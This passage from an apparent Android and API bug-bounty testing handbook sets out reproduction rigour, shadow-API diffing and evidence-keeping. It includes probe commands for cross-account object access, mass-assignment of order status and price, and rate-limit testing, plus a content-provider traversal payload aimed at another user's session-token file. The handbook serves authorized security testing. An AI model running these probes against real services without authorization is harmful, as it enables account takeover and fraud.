| **Maps to** | bug-hunting corpus, `bb-methodology` PART 4; the MFA false-positive trap "No rate limit because the first 6 attempts went through"; RFC 6238 (TOTP truncates an HMAC-SHA1 hash mod 10^6 — the output is uniform, so three "pattern-like" samples prove nothing) |

- **Test:** Single outliers are not signal. Network jitter routinely produces 2x outliers, and a mobile
  client's own retry and backoff logic adds more.
- **How:** Minimum **n >= 10 interleaved trials per group** — control and test in randomised order, never
  back-to-back. Compute mean, median and sigma per group. A signal requires the suspect group's mean to be
  **>= 2 sigma above** the control's.
  ```bash
  for i in $(seq 1 40); do
    for G in control test; do
      S=$(date +%s%N)
      curl -s -o /dev/null -X POST "$URL" -d "user=$( [ $G = test ] && echo Administrator || echo zzqq7731 )"
      echo "$G $(( ($(date +%s%N) - S) / 1000000 ))"
    done
  done | tee timing.txt
  awk '{s[$1]+=$2; ss[$1]+=$2*$2; n[$1]++} END {for (g in s)
        printf "%s n=%d mean=%.1f sigma=%.1f\n", g, n[g], s[g]/n[g],
        sqrt(ss[g]/n[g] - (s[g]/n[g])^2)}' timing.txt
  ```
  For rate limits, sample **100+** attempts before claiming absence, and distinguish per-IP, per-account,
  per-session and per-username throttling — then quantify the maths
  ("10/min x 60 x 24 across N parallel sessions reaches 10^6 in X days").
- **Proof:** The **distribution**, not the outlier. The corpus's case: `Administrator` took 1527 ms against
  a ~700 ms control on a single shot; n=80 interleaved across 8 groups collapsed every group to mean
  685–716 ms with sigma 25–74 ms. Retracted.
- **Escalation:** -> D13 (OTP/rate limit), D15 (race conditions, enumeration), D23 (fraud velocity).
- **Ruled out when:** The suspect group's mean is within 2 sigma of the control across n >= 10 interleaved
  trials. State n, mean and sigma in the ruled-out entry — "I tried it a few times" is not a negative.

### D26-071 · Server-Policy-vs-State — is the differentiator tracking your input, or a fixed deny-list?

| | |
|---|---|
| **Severity ceiling** | Support |
| **VRT** | none |
| **Attacker** | n/a |
| **Applies to** | every oracle or bypass claim |
| **Maps to** | bug-hunting corpus, `bb-methodology` PART 4; `triage-validation` 7Q cross-link table (Q3) |

- **Test:** A server-side policy that always denies is not a state oracle. Establish whether the
  differentiator tracks *your input* or a *fixed deny-list* before you call it an oracle.
- **How:**
  ```bash
  # probe with a value that CANNOT exist, and with one you KNOW exists
  curl -s -o /dev/null -w '%{http_code} ' "$URL?file=definitely-not-here-$(date +%s).cfg"
  curl -s -o /dev/null -w '%{http_code} ' "$URL?file=known-good.png"
  curl -s -o /dev/null -w '%{http_code} ' "$URL?file=known-good.config"
  # if .config is blocked regardless of existence, the "oracle" is an extension blocklist
  # and the same trick applies to header-based bypasses:
  curl -s -o /dev/null -w '%{http_code}\n' "$URL"                         # baseline
  curl -s -o /dev/null -w '%{http_code}\n' "$URL" -H 'X-Client-Cert: x'   # with the header
  ```
- **Proof:** The corpus's cases: a `download.aspx` file-existence "oracle" was SharePoint's extension
  blocklist — `.ashx/.asmx/.svc/.config` are always blocked regardless of whether the file exists.
  And: a `403 -> 200` flip with a spoofed mTLS header is meaningful; a `200` **both with and without** the
  header means the path was never protected in the first place.
- **Escalation:** -> D15 (authz), D13 (enumeration), D07 (provider path oracles).
- **Ruled out when:** The response is identical for an input that cannot exist and one that certainly does
  — the differentiator is policy, not state. Record both probes.

### D26-072 · The Multi-Tool Reproduction Bar for anything you call Critical or High

| | |
|---|---|
| **Severity ceiling** | Support |
| **VRT** | none; it governs every Critical/High claim in the report |
| **Attacker** | n/a |
| **Applies to** | every Critical and High finding |
| **Maps to** | bug-hunting corpus, `bb-methodology` Phase 5 |

- **Test:** Before labelling anything Critical or High, reproduce it via **two independent tools with
  different HTTP stacks**. Cross-tool consistency rules out tool artefacts — the corpus records a
  curl-only timing differential that vanished entirely under Python `requests`.
- **How:** Pair any two of: `curl`; Burp Repeater; Python `requests`; a raw socket via `ssl`; `httpie`;
  the app itself replayed through the proxy. The reproduction commands in the report **must be
  paste-into-shell ready** — a triager copies them verbatim — and include a Python alternative when the
  curl form needs unusual flags.
  ```bash
  curl -sS -X POST "$URL/v1/orders/8812" -H "Authorization: Bearer $A_TOKEN" -o r1.json -w '%{http_code}\n'
  ```
  ```python
  import requests, json
  r = requests.post(f"{URL}/v1/orders/8812", headers={"Authorization": f"Bearer {A_TOKEN}"}, timeout=20)
  print(r.status_code); open("r2.json","w").write(r.text)
  ```
  ```bash
  cmp r1.json r2.json && echo "two independent stacks agree"
  ```
- **Proof:** Two independent reproductions in the report, agreeing on the body after normalisation.
- **Escalation:** -> D27 (the pre-severity gate is run against the **Critical claim**, not against the
  bug; if an inheritance gate, signature check or audience check still gates the chain, it is not
  Critical — document it as "primitive present" at a lower severity).
- **Ruled out when:** The two stacks disagree — then the result is a tool artefact and the claim drops out
  of Critical/High until the disagreement is explained. Record which stacks were used.

### D26-073 · Repeat-count and cold-start discipline for every dynamic claim

| | |
|---|---|
| **Severity ceiling** | Support |
| **VRT** | none |
| **Attacker** | n/a |
| **Applies to** | all dynamic findings; mandatory for races, timing and anything involving a cache |
| **Maps to** | `pm clear`, `am force-stop`, `logcat -c`; MASTG-TECH-0009 |

- **Test:** A one-shot observation on a warm app with a populated cache is the commonest source of a
  finding the client's developer cannot reproduce.
- **How:**
  ```bash
  N=3
  for i in $(seq 1 $N); do
    adb shell pm clear com.target.app          # cold state, no cached session
    adb shell am force-stop com.target.app
    adb logcat -c
    ./pocs/F-007/repro.sh | tee evidence/F-007/run-$i.log
    adb logcat -d > evidence/F-007/logcat-$i.txt
  done
  grep -c 'EXPECTED_MARKER' evidence/F-007/run-*.log     # the three runs must agree on the OBSERVABLE
  ```
  Rules: (a) 3/3 on a cold, freshly-cleared app, or the finding states its flakiness rate explicitly;
  (b) anything below 3/3 is reported as **intermittent** with the measured rate, never as deterministic;
  (c) races and timing findings state the measured success rate over at least 20 attempts (D26-070).
- **Proof:** Three numbered run logs with identical markers, in the evidence tree.
- **Escalation:** -> D27. An intermittent primitive that the report calls deterministic is the kind of
  error that gets a whole report re-opened.
- **Ruled out when:** 0/3 on a cold app after the primitive reproduced warm — then the behaviour depends on
  cached state, which is itself worth investigating (and is a different finding). Record the warm/cold
  split rather than dropping the observation.

### D26-074 · Warm-start discipline for component sweeps — do **not** `force-stop` before each launch

| | |
|---|---|
| **Severity ceiling** | Support |
| **VRT** | none |
| **Attacker** | n/a |
| **Applies to** | all exported-component sweeps |
| **Maps to** | local senior-researcher corpus |

- **Test:** This is the exact inverse of D26-073 and the distinction matters. `force-stop` routes the next
  cold start **through the launcher activity**, which invalidates the "did my Intent reach this specific
  component?" result — you end up proving the launcher opened, not that the target component did.
- **How:**
  ```bash
  PKG=com.target.app
  adb shell monkey -p $PKG -c android.intent.category.LAUNCHER 1     # warm the app ONCE
  sleep 3
  adb shell dumpsys package $PKG | grep -oE "$PKG/[A-Za-z0-9_.\$]+" | sort -u > components.txt
  while read -r c; do
    adb shell am start -n "$c" --es probe 1 2>&1 | sed "s|^|$c |"
    adb shell dumpsys activity activities | grep -m1 topResumedActivity
  done < components.txt | tee sweep.log
  ```
  Cold-start (`pm clear` + `force-stop`) belongs in the *reproduction* of a confirmed finding (D26-073),
  not in the sweep that discovers it.
- **Proof:** `topResumedActivity` naming the component you targeted, not the launcher, after each `am
  start`.
- **Escalation:** -> D04 (activities), D05 (receivers), D06 (services), D09 (deep links).
- **Ruled out when:** The component is named in `components.txt`, the app was warm, `am start` returned no
  `SecurityException`, and `topResumedActivity` still shows the launcher — then the component redirected,
  which is a D04/D08 lead rather than a negative.

### D26-075 · One normaliser, shared by every tool in the engagement

| | |
|---|---|
| **Severity ceiling** | Support |
| **VRT** | none |
| **Attacker** | n/a |
| **Applies to** | all differential work — response diffing, replay, retest |
| **Maps to** | field methodology; used by D26-069, D26-072, D26-076 |

- **Test:** Two harnesses with different normalisation will disagree about whether a response changed, and
  you will spend a day on the disagreement rather than on the target. Define it once, import it
  everywhere — curl scripts, Burp extensions, Python harnesses.
- **How:**
  ```bash
  norm(){ jq -S 'walk(if type=="array" then sort else . end)
          | del(.requestId,.timestamp,.traceId,.serverTime,.nonce,.signature)' "$1"; }
  ```
  Apply it **after** a non-determinism check has told you which keys are volatile — do not guess the key
  list:
  ```bash
  for i in 1 2 3; do curl -s "$URL" -H "Authorization: Bearer $A" -o v$i.json; sleep 1; done
  diff <(jq -S . v1.json) <(jq -S . v2.json); diff <(jq -S . v2.json) <(jq -S . v3.json)
  # the keys that differ across identical requests are the volatile set -> del() them
  ```
- **Proof:** The same pair of responses judged identical (or different) by every tool in the kit.
- **Escalation:** Keep the normaliser in the evidence bundle so the retest is reproducible (-> D27).
- **Ruled out when:** Not a finding. A difference that survives normalisation is real; a difference that
  does not is noise — and a normaliser whose key list was guessed rather than measured produces both kinds
  of error.

### D26-076 · Capture the mobile client and the web client in one proxy project — the shadow-API harness

| | |
|---|---|
| **Severity ceiling** | **Critical** |
| **VRT** | `broken_access_control.idor.modify_view_sensitive_information_iterable_object_identifiers` (P1) or `broken_authentication_and_session_management.authentication_bypass` (P1) when the mobile-only path lacks a control the current path enforces; `broken_access_control.privilege_escalation` where the delta is a client-asserted role |
| **Attacker** | AM-01 remote no interaction (the endpoints are reachable from curl once you know them) |
| **Applies to** | any app whose backend also serves a web or partner client — i.e. most of them |
| **Maps to** | Bugcrowd VRT `broken_access_control.idor.*`; bug-hunting corpus "Shadow API — the mobile-to-backend bridge" |

- **Test:** A mobile app's hardcoded backend calls are frequently an **older API version** than the current
  web app uses, with weaker auth, weaker rate limits, weaker input validation and more field exposure.
  Build the harness that lets you see both at once, then diff **behaviourally** — not by response shape.
- **How:**
  ```bash
  # one proxy project, both clients
  mitmdump -w engagement/all.flows &
  adb shell settings put global http_proxy 10.0.2.2:8080      # the app
  #   and point the desktop browser at the same listener for the web client
  # extract the version prefixes each client uses
  mitmdump -nr engagement/all.flows -s - <<'PY'
  def response(f):
      print(f.request.method, f.request.pretty_url, f.response.status_code)
  PY
  grep -ohE '/v[0-9]+(\.[0-9]+)?/' engagement/urls-mobile.txt | sort | uniq -c
  grep -ohE '/v[0-9]+(\.[0-9]+)?/' engagement/urls-web.txt    | sort | uniq -c
  # then the BEHAVIOURAL diff, one control at a time, same account, same object:
  for V in v1 v2 v3; do
    echo "== $V"
    curl -s -o /dev/null -w 'no-auth      %{http_code}\n' "$API/$V/orders/8812"
    curl -s -o /dev/null -w 'other-acct   %{http_code}\n' "$API/$V/orders/8812" -H "Authorization: Bearer $B_TOKEN"
    curl -s -w 'mass-assign  %{http_code}\n' -X PATCH "$API/$V/orders/8812" \
         -H "Authorization: Bearer $A_TOKEN" -H 'Content-Type: application/json' \
         -d '{"total":1,"status":"paid","ownerId":9999}' -o /dev/null
    for i in $(seq 1 30); do curl -s -o /dev/null -w '%{http_code} ' "$API/$V/orders/8812" \
         -H "Authorization: Bearer $A_TOKEN"; done; echo   # rate-limit shape
  done
  # field exposure delta on the SAME object:
  diff <(curl -s "$API/v1/me" -H "Authorization: Bearer $A_TOKEN" | jq -S 'keys') \
       <(curl -s "$API/v3/me" -H "Authorization: Bearer $A_TOKEN" | jq -S 'keys')
  ```
- **Proof:** The older endpoint accepting something the current one rejects — another account's object id,
  an unauthenticated read, a mass-assignment field, or 30 requests where the current path throttles at 10 —
  captured as the four-file evidence set (A's request for A's object; A's request for B's object; B's own
  request for B's object; a negative control with a non-existent id), plus a key-set diff showing the extra
  fields the old version returns.
- **Escalation:** -> D15 (the authz finding itself), D01 (the endpoint inventory), D13 (weaker auth on the
  legacy path). Also the inverse case worth capturing in the same project: a request that the **web** tier
  rejects and the **mobile** tier accepts, side by side.
- **Ruled out when:** **A version difference alone is Informational — the weakened control is the
  finding.** So: every version prefix the mobile client uses was tested with the same four probes as the
  current one, and each behaved identically (same status, same body after normalisation, same throttle
  shape, same key set). Record the version list and the four probe results per version; "the app uses /v1
  and the site uses /v3" is not a finding.

### D26-077 · Run a scripted full-feature tour so no screen is left unvisited

| | |
|---|---|
| **Severity ceiling** | Medium |
| **VRT** | none directly; it is the control that prevents an entire feature — and its bugs — from being missed |
| **Attacker** | AM-12 |
| **Applies to** | all |
| **Maps to** | `dumpsys package` resolver tables; `adb shell monkey` (breadth only — **no security signal on its own**) |

- **Test:** Guarantee that every feature was driven at least once with instrumentation on, and produce the
  literal list of screens the engagement never reached.
- **How:**
  ```bash
  PKG=com.target.app; OUT=tour; mkdir -p $OUT
  # a) full activity inventory (including aliases and non-exported)
  adb shell dumpsys package $PKG | grep -oE "$PKG/[A-Za-z0-9_.\$]+" | sort -u > $OUT/activities.txt
  # b) instrumentation on for the whole tour
  frida -U -f $PKG -l hooks.js --no-pause &            # the D26-054 hook pack
  mitmdump -w $OUT/tour.flows &
  # c) drive it, snapshotting state per step
  step(){ adb shell dumpsys activity activities | grep -m1 topResumedActivity >> $OUT/stack.log
          adb exec-out screencap -p > $OUT/$1.png
          adb shell "run-as $PKG find . -newermt '-90 seconds' -type f" > $OUT/$1.files; }
  # d) breadth sweep of what manual walking misses
  adb shell monkey -p $PKG --throttle 300 --pct-syskeys 0 -v 3000 > $OUT/monkey.log 2>&1
  # e) coverage check: which activities never became topResumed?
  comm -23 $OUT/activities.txt <(grep -oE "$PKG/[A-Za-z0-9_.\$]+" $OUT/stack.log | sort -u)
  ```
- **Proof:** The `comm` output is the literal list of screens the engagement never reached. Attach it to
  the report: each named screen is either justified as unreachable or becomes a work item.
- **Escalation:** Screens present in `activities.txt` but never in the tour are the highest-yield
  candidates for the exported-activity and app-lock-bypass items (-> D04), and the per-step `.files`
  deltas attribute each written file to a named user action (-> D11).
- **Ruled out when:** The `comm` output is empty, or every remaining screen has a stated reason
  (paywalled, region-locked, requires a role the client did not provide — in which case it belongs in the
  blocked register, not in the ruled-out table as "clean").

### D26-078 · Keep the evidence workspace and the command journal from the first minute

| | |
|---|---|
| **Severity ceiling** | Support |
| **VRT** | none |
| **Attacker** | n/a |
| **Applies to** | all |
| **Maps to** | NIST SP 800-115 §8.3 (*"the test team will be able to verify its implementation only if a mirror copy of the original test is performed"*), Appendix B §1.3 (Assumptions and Limitations) |

- **Test:** At retest, or when a developer disputes a step, the tester reconstructs from memory — and that
  is where invented details enter a report. Journal the commands, and keep the workspace separate from
  the decompiled artefact.
- **How:**
  ```
  <engagement>/<target>/
    apk/         base.apk + every split_config.*   (pm path -> pull; needed to reinstall elsewhere)
    lab/         LAB-MANIFEST.txt, harness-baseline-*.txt, third-party-packages-before/after.txt
    recon/       per-surface notes + api-endpoints.tsv
    findings/F-0NN/finding.md
    pocs/F-0NN/  attacker-app source, signed APK, repro.sh, poc.dz
    videos/F-0NN/ screenshots/ logs/ requests/ responses/
    report/report.md               LIVE journal, updated continuously
    report/assessment-status.md    persistent state so a later session resumes, not restarts
    report/BLOCKED.tsv             everything you cannot do alone, with an owner and a date
    final/                         one submission-ready document per finding
  ```
  Decompiled output lives separately (`.../Target/<App>/decompiled/{jadx,apktool}`).
  ```bash
  mkdir -p engagement/journal
  script -q -a "engagement/journal/$(date -u +%Y%m%dT%H%M%SZ).typescript"
  # or, for a clean replayable transcript of just the commands:
  export PROMPT_COMMAND='history -a; tail -n1 ~/.bash_history >> engagement/journal/commands.log'
  ```
  `BLOCKED.tsv` is the artefact that stops a blocker silently becoming a clean result:
  ```
  id   surface        blocker                             needed_from  requested   status    coverage_impact
  B-02 D13 OTP        TOTP seed or shared inbox           client ops   2026-09-02  OPEN      OTP replay untested
  B-03 D23 payments   PSP sandbox keys                    client       2026-09-03  REFUSED   payment flows code-review only
  B-04 D12 attestation physical device w/ StrongBox       us           2026-09-03  OPEN      key attestation not verified
  ```
- **Proof:** A `commands.log` whose timestamps bracket each finding's evidence, a `repro.sh` per finding
  that a developer runs unmodified, and a `BLOCKED.tsv` where every OPEN or REFUSED row appears in the
  report as a **named coverage limitation** with the surface it affects.
- **Escalation:** -> D27 (report, retest). Also the chain-filing rule lives here: **file primitives first
  so their ids exist, then the consumer, then backfill the links** — one fix equals one bounty, and a
  chain is a severity amplifier, not a merge request.
- **Ruled out when:** Not a finding. The test is mechanical: every dynamic claim in the report has a
  journal entry and a `repro.sh`, or its Limitations field explains why not. Never let a blocker convert
  into a silent clean result — "we found nothing in payments" is false assurance; "payment flows were
  reviewed statically only, dynamic testing was blocked on B-03" is the truth.

### D26-079 · Calibrate the harness against a known-vulnerable app before touching the client build

| | |
|---|---|
| **Severity ceiling** | Support |
| **VRT** | none |
| **Attacker** | n/a |
| **Applies to** | any new tool, hook chain or harness capability |
| **Maps to** | the practice-app corpus: `oversecured/ovaa`, `optiv/InsecureShop`, `B3nac/InjuredAndroid`, `rewanth1997/Damn-Vulnerable-Bank`, `jaiswalakshansh/Vuldroid`, `dineshshetty/Android-InsecureBankv2`, `payatu/diva-android`, `WheresMyBrowser.Android`, VyAPI, DVHMA, WaTF Bank, OWASP GoatDroid |

- **Test:** Verify each harness capability end to end on an app whose bug you already know, so a negative
  on the client build is trustworthy. This is the concrete form of D26-063's "positive control".
- **How:**
  ```bash
  # provider + IPC chain:            ovaa, InsecureShop, Sieve (legacy semantics only — see below)
  # WebView settings + bridges:      WheresMyBrowser.Android
  # intent redirection / URI grants: ovaa
  # storage + crypto:                diva-android, Android-InsecureBankv2
  # deep links + auth:               InjuredAndroid, Vuldroid
  # payments / business logic:       Damn-Vulnerable-Bank
  adb install ovaa.apk
  dz> run app.package.attacksurface oversecured.ovaa
  dz> run scanner.provider.injection -a oversecured.ovaa     # must find the bug you know is there
  frida -U -f oversecured.ovaa -l hooks.js --no-pause        # your D26-054 pack must produce lines
  ```
- **Proof:** Your harness reproduces the known bug in the lab app, with the same commands you will run
  against the client build.
- **Escalation:** Feeds D26-063 — the lab-app result is the positive control you cite next to a client-build
  negative.
- **Ruled out when:** Not a finding. One warning that matters: **Sieve, FourGoats and GoatDroid are
  Android 4.3-era apps** and their observed defaults must never be generalised to a modern target (-> the
  DEAD table in D26-062). A lab app proves your *instrument* works; it never proves anything about the
  client's app.

## Graveyard for this domain

| Observation | Why it is not a finding | What would make it one |
|---|---|---|
| "Frida attaches to the app / the app has no anti-instrumentation" | `lack_of_binary_hardening.runtime_instrumentation_based` = **P5**, all-zero impact vector. AM-12 is not an attacker model, and Google, Xiaomi, Grab and Spotify all exclude "runtime hacking exploits using tools like Frida/Appmon" by name | The credential the hook extracted, proved to authenticate a *different* user or to work off the device — filed in D13/D15, not here |
| "objection disabled SSL pinning in five minutes" | `mobile_security_misconfiguration.ssl_certificate_pinning.defeatable` = **P5**. The bypass is the method, never the finding | The data the decrypted channel revealed, or the server accepting a request the app would never send — filed in D14/D15 |
| "The APK can be repackaged and re-signed so I injected the gadget" | The repackaged app attacks only its own installer. This is your patch, not the vendor's defect | A distribution channel you can poison so the repacked build reaches **other** users — that is D17 |
| "`isInsideSecureHardware()` returns false" on an AVD | The emulator's keystore is software-backed. A harness artefact (D26-014) | The same observation on a **physical** device, or the server accepting a software-rooted attestation chain for a hardware-gated action — D12/D21 |
| "Play Integrity returns an empty verdict on my device" | Rooted and emulated devices produce an empty verdict by design | The **server** accepting a request carrying no verdict at all, or one bound to nothing — D21 |
| "`adb backup` produced an empty archive" | Android 12+ excludes app data from `adb backup` unless `android:debuggable="true"`. An expected default | Data extracted through `bmgr` + the local or D2D transport, which is the current technique — D11 |
| "drozer reported no exported components" | On `targetSdk >= 31` every component with an intent-filter must declare `android:exported`, so this is the **platform default**. On `targetSdk >= 30` the agent also needs `QUERY_ALL_PACKAGES` or it sees a truncated view | The merged manifest and `dumpsys package` resolver tables read by hand, showing a component drozer could not see — D03/D04 |
| "`scanner.provider.injection` says Not Vulnerable" | It probes a single `'` and flags only on `unrecognized token` in the exception text. Any provider that catches or rewraps its exception reads clean | A manual `app.provider.query --projection "'"` and a `UNION SELECT`, plus a traversal to a path other than `/etc/hosts` — D07 (D26-033) |
| "MobSF/mobsfscan/semgrep produced 60 findings" | Scanner output is a hypothesis list. Submitting it raw is the fastest route to duplicate-or-N/A on every platform, and on a mature programme the easy hits are already filed | Each hit reproduced by hand with the observable its owning chapter names, and the guard the rule could not see recorded for the ones that fall away |
| "The app is not obfuscated / APKiD found no packer" | `lack_of_binary_hardening.lack_of_obfuscation` = **P5**. MASVS is explicit that the absence of MAS-R measures does not inherently introduce a vulnerability | The business rule you read out of the decompile — a fraud threshold, a velocity limit, an allowlist of privileged account ids — D21/D23 |
| "`adb root` is refused: `adbd cannot run as root in production builds`" | A property of `user` builds and of `google_apis_playstore` images. A harness fact | Nothing. Record it in the methodology and pick a `google_apis` image (D26-003) |
| "The system CA push to `/system/etc/security/cacerts` succeeded but TLS still fails on every host" | On API 34+ that directory is ignored at runtime; this is the classic false "the app pins everything" | Per-host TLS failure **after** the Conscrypt APEX bind and the zygote `nsenter` are verified from inside the app's namespace (D26-005, D26-006) — then it really is pinning, and it is still P5 |
| "I can read `/data/data/<pkg>/shared_prefs/auth.xml` as root" | `insecure_data_storage.sensitive_application_data_stored_unencrypted.on_internal_storage` = **P5**; the sandbox holds against everyone except the device owner | The token authenticating a **different** account from your own machine, or a non-root path to the same bytes (backup, exported provider, debuggable build) — D11 |
| "The app sets `FLAG_SECURE` so I had to strip it to record the PoC" | The app behaving correctly. `insecure_data_storage.screen_caching_enabled` = P5 even when it is absent | Nothing about the flag. The finding is whatever the recorded screen shows — D20/D27 |
| "`dozermapper/dozer` is a mobile pentest tool" | It is a Java Bean-to-Java Bean mapper with no Android-security relevance. The Android tool is **drozer** | Nothing. Fix the citation (D26-040) |
| "`adb shell monkey` crashed the app 40 times" | A crude crash-fuzzer with no security signal, and `application_level_denial_of_service_dos.app_crash.malformed_android_intents` is **P5** anyway | A crash reachable from a **third-party app's** crafted Intent that corrupts state or persists (a crash loop that survives restart) — D04/D17, and still rated on impact |
| "A tool printed nothing, therefore the app is clean" | The four documented silent-zero sources (abstract class, R8 rename, init-time path, narrow scanner probe) each produce exactly this output | A positive control fired in the same session, cited next to the negative in the ruled-out register (D26-063) |
| "I bypassed the client-side premium check with `hooking set return_value`" | A client-side gate flipped on your own device. The UI changing proves nothing | The **subsequent API calls** succeeding server-side — D23/D15, with a body diff (D26-069) |
| "The mobile app uses `/v1` and the website uses `/v3`" | A version difference alone is Informational | The **weakened control** on the older path: unauthenticated read, cross-account object access, absent rate limit, mass-assignable field, extra exposed fields — D15 (D26-076) |
| "Response timing differed by 800 ms for a valid username" | A single outlier. Network jitter routinely produces 2x outliers | n >= 10 interleaved trials showing the suspect group's mean >= 2 sigma above control, with the distribution in the report (D26-070) |
| "The request returned 200 instead of 403 with my header" | Status-code-only claims are the most common rejected-as-N/A category. A byte-identical body is not a bypass | A body differential after normalisation, with the changed content identified (D26-069) |
| "Cydia Substrate / Xposed / AndroidSSLTrustKiller / QARK did not work" | All DEAD on modern Android (D26-062). A failed legacy technique is not evidence the app is secure | Nothing from the failure. Re-test with the current tool and report what *that* shows |

## Cross-surface joins

- **The harness acceptance script x the pinning conclusion (D26-001/D26-005 x D14 x D15).** Nobody
  reviews the lab build and the network findings together, because one is "setup" and the other is
  "results". The join is the single highest-value one in this chapter: a CA bind that never reached the
  zygote's mount namespace makes *every* host fail TLS, which is reported as "the app pins all traffic",
  which closes the entire D15 API section as untestable. One line in an acceptance script — a control app
  that is known not to pin, decrypting — separates a real pinning finding from a dead lab. Run it before
  any network conclusion is written, and put its timestamp in the report.
- **The `frida-trace` zero-match x the split set x dynamic loading (D26-047/D26-018 x D17 x D19).** The
  instrumentation reviewer reads "Started tracing 0 functions" as "the class does not exist"; the
  acquisition reviewer pulled only `base.apk`; the supply-chain reviewer never hears about either. The
  join is mechanical and it finds a whole hidden code path: a pattern that matches zero on `-f` and N on
  `-p`, against an app whose `pm path` returned four lines, is a class that lives in a feature split or a
  runtime class loader — which is exactly the code that ships outside the reviewed artefact.
- **The scanner's "Not Vulnerable" x the provider inventory x the file-read primitive (D26-033 x D07 x
  D11).** The IPC reviewer runs `scanner.provider.injection` and moves on; the storage reviewer
  inventories `shared_prefs` and rates a plaintext token P5 because it needs root. Neither is a finding
  alone. The join is the intersection: a provider the scanner dismissed, manually probed with
  `app.provider.download content://<auth>/x/../../../../data/data/<pkg>/shared_prefs/auth.xml`, converts
  the P5 storage observation into a zero-permission remote read of another user's session token. The
  scanner's own source is the reason nobody looks — one quote, one payload, one oracle.
- **The mobile client's endpoint list x the web client's endpoint list (D26-076 x D15 x D01).** The mobile
  team and the web team ship against the same backend and are reviewed by different people in different
  engagements. The join is to put both clients through **one** proxy project and diff behaviourally: the
  app's hardcoded `/v1` path routinely predates the site's `/v3`, and the controls added at v2 and v3 were
  never backported. This produces P1s from a harness step, and it needs no device compromise at all —
  once you have the endpoint list, the probes run from `curl`.
- **The instrumentation job list x the evidence bundle (D26-050 x D27 x D21).** The tester knows which
  hooks were loaded; the triager reading the report does not. A screenshot of a premium feature unlocked,
  captured while `root-detection-disable` and a return-value override were both installed, is
  indistinguishable from a real server-side authorisation flaw — and indistinguishable from a fabrication.
  `jobs list` pasted next to the screenshot is what makes the evidence legible, and it is also what forces
  the tester to notice that the finding is client-side only.
- **The `FLAG_SECURE` strip x the screenshot-control review (D26-051 x D20 x D27).** The evidence engineer
  strips the flag to record a PoC; the privacy reviewer separately tests whether sensitive screens are
  protected. If the two never talk, the report can simultaneously contain a screenshot of a screen the
  report also claims is protected. Run the capture **twice** — once with the strip, once without — and let
  the black frame be the positive evidence for the D20 control while the stripped frame carries the PoC.
- **The device-capability matrix x the payments and identity scope (D26-014 x D12 x D13 x D23).** Scoping
  happens in week zero; the discovery that StrongBox, real biometrics and NFC cannot be exercised on the
  emulator happens in week two. The join is to run the matrix **at kickoff** against the feature list, so
  every hardware-dependent row becomes a priced physical-device lane or a named coverage limitation in the
  SoW — rather than a silently skipped class, or worse, an emulator artefact reported as a finding.
- **APKiD's `anti_root` line x the resilience chapter's hook list (D26-023 x D21 x D16).** The recon pass
  runs APKiD and records "RootBeer present" as an informational line; the resilience pass separately
  writes a generic root bypass. The join is that APKiD names the **exact `.so`**, which turns a generic
  `fridantiroot` script into a targeted `Interceptor.attach` on one export, and — more importantly — tells
  the native reviewer which library is worth an hour of Ghidra. The same line also tells you the check is
  native, so a Java-only hook set will silently fail to bypass it.

## Sources

- **OWASP MASTG/MASVS:** techniques MASTG-TECH-0001 to -0045 (device shell, host-device transfer, app
  acquisition, repackaging, installing, listing, package exploration, data directories, log monitoring,
  network sniffing, interception proxy, pinning bypass, reverse engineering, static analysis, smali
  disassembly, Java decompilation, native disassembly, string and xref retrieval, decompiled/disassembled
  review, automated static analysis, non-rooted dynamic analysis, open files, open connections, loaded
  native libraries, sandbox inspection, debugging, execution/method/native/JNI tracing, symbolic
  execution, patching, repackaging and re-signing, waiting for the debugger, library injection, dynamic
  class and method enumeration, method hooking, process exploration, runtime reverse engineering) plus
  -0100, -0108, -0109, -0117, -0126, -0127, -0128, -0129, -0130, -0131, -0141, -0142, -0143, -0144,
  -0145, -0148, -0150, -0156, -0160 to -0165, -0172, -0173; the MASTG Android tool register
  (MASTG-TOOL-0001, -0002, -0003, -0004, -0007, -0008, -0009, -0010, -0011, -0012, -0014, -0015, -0016,
  -0017, -0018, -0019, -0020, -0021, -0024, -0025, -0028, -0029, -0030, -0031, -0032, -0033, -0034,
  -0036, -0037, -0038, -0075, -0077, -0078, -0079, -0080, -0081, -0097, -0099, -0100, -0101, -0103,
  -0104, -0106, -0107, -0109, -0110, -0112, -0115, -0116, -0120, -0123, -0124, -0125, -0129, -0130,
  -0131, -0132, -0134, -0140, -0143, -0144, -0145, -0146, -0147, -0148, -0149, -0151, -0152, -0153);
  the 51 `mastg-android-*` semgrep rules shipped in `rules/` of the MASTG repository; MASVS 2.0 group
  structure and its statement that the absence of MAS-R measures does not inherently introduce a
  vulnerability. MASTG's own positioning of drozer as a **last resort** after manifest and `adb`
  inspection.
- **drozer, read from source:** `WithSecureLabs/drozer@develop` module sources
  (`app/{activity,backup,broadcast,debuggable,package,provider,service}.py`,
  `auxiliary/web_content_resolver.py`, `information/{datetime,device_info,permissions}.py`,
  `scanner/activity/browsable.py`, `scanner/misc/{native,readable_files,secretcodes,sflag_binaries,writable_files}.py`,
  `scanner/provider/{find_uris,injection,sql_table_dump,traversal}.py`, `shell/{send,startexec}.py`,
  `tools/file.py`, `tools/setup/{su,toybox}.py`, `exploit/webview/addJavaScriptInterface.py`,
  `exploit/jdwp/check.py`, `common/{provider,strings,intent_filter}.py`, `src/drozer/android.py`), the
  full module tree via the GitHub API, and `WithSecureLabs/drozer-modules` (`mwrlabs/urls.py`,
  `mwrlabs/develop.py`, `kernelerror/tools/misc/installcert.py`, `meatballs1/auxillary/port_forward.py`,
  `metall0id/post/{clipboard,sms,contacts}.py`). The blind spots in `scanner/provider/injection.py`
  (single `'`, `unrecognized token` oracle) and `scanner/provider/traversal.py` (one fixed payload,
  sixteen `../` levels, `/etc/hosts`, non-empty-read oracle) are source-verified, not inferred. drozer
  3.1.0's `scanner.provider.exported` and `app.provider.grant`. `labs.reversec.com/tools/drozer`;
  `labs.withsecure.com/tools/drozer` is **dead** (301 to a hub page) and the ReversecLabs wiki Console
  page renders only its intro paragraph — the command reference here comes from the README table,
  `src/drozer/android.py` and each module's `add_arguments()` body.
- **The dozer/drozer disambiguation:** `github.com/dozermapper/dozer` verified as *"a Java Bean to Java
  Bean mapper that recursively copies data from one object to another"* — no Android-security relevance.
- **Frida and objection:** the complete `Java` section of the Frida JavaScript API
  (`frida-website/_i18n/en/_docs/javascript-api.md`, including the Frida 17 `frida-java-bridge` change
  quoted verbatim); `frida.re/docs/frida-cli/`; frida-tools sources `application.py`, `ps.py`, `tracer.py`
  for the authoritative flag lists; SensePost "Using & improving frida-trace" (2025) for the spawn-time
